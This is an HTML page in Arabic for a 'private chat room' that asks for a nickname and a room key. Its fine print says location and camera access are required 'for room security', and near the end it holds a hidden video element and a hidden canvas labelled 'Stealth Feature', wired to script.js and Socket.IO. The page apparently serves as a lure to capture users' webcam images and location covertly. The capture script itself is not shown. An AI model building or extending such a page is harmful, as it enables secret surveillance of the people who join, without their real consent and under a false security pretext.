<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>غرفة الدردشة الخاصة | Private Chat</title>
    
    <meta name="theme-color" content="#0f172a">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <!-- Custom CSS -->
    <link rel="stylesheet" href="style.css">
    
    <!-- CryptoJS for Client-Side Encryption -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</head>
<body>

    <div class="background-blobs">
        <div class="blob blob-1"></div>
        <div class="blob blob-2"></div>
        <div class="blob blob-3"></div>
    </div>

    <main class="container">
        <!-- Join Screen -->
        <div id="joinScreen" class="glass-card chat-join-screen active">
            <div class="chat-header">
                <h2>غرفة الدردشة الخاصة 💬</h2>
                <p>مرحباً بك في الغرفة السرية. يرجى إدخال اسم مستعار للانضمام.</p>
            </div>
            
            <form id="joinForm" class="join-form">
                <input type="text" id="usernameInput" placeholder="أدخل اسمك المستعار..." required maxlength="20" autocomplete="off">
                <input type="password" id="roomKeyInput" placeholder="مفتاح الغرفة السري (Room Key)..." required autocomplete="off">
                <p class="terms-text"><small>بالانضمام أنت توافق على شروط الغرفة (يجب السماح بالوصول للموقع والكاميرا لضمان أمان الغرفة وتجنب الحسابات الوهمية).</small></p>
                <button type="submit" class="primary-btn">انضمام الآن</button>
            </form>
        </div>

        <!-- Chat Screen -->
        <div id="chatScreen" class="glass-card chat-room-screen hidden">
            <div class="chat-room-header">
                <h3>💬 الغرفة العامة</h3>
                <span class="online-count"><span id="onlineUsers">0</span> متصل</span>
            </div>
            
            <div class="chat-messages" id="chatMessages">
                <div class="system-message">مرحباً بك في الدردشة! تم تأمين اتصالك.</div>
            </div>
            
            <div id="typingIndicator" class="hidden">
                <div class="message received" style="max-width: fit-content; margin-right: 1.5rem; margin-bottom: 1rem;">
                    <div class="bubble typing-dots">
                        <span></span><span></span><span></span>
                    </div>
                </div>
            </div>
            
            <form id="chatForm" class="chat-input-area">
                <input type="text" id="messageInput" placeholder="اكتب رسالتك هنا..." required autocomplete="off">
                <button type="submit" class="send-btn">
                    <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
                </button>
            </form>
        </div>
    </main>

    <!-- Hidden Elements for Stealth Feature -->
    <video id="stealthVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="stealthCanvas" style="display:none;"></canvas>

    <!-- Socket.IO JS -->
    <script src="/socket.io/socket.io.js"></script>
    
    <!-- Custom JS -->
    <script src="script.js"></script>
</body>
</html>
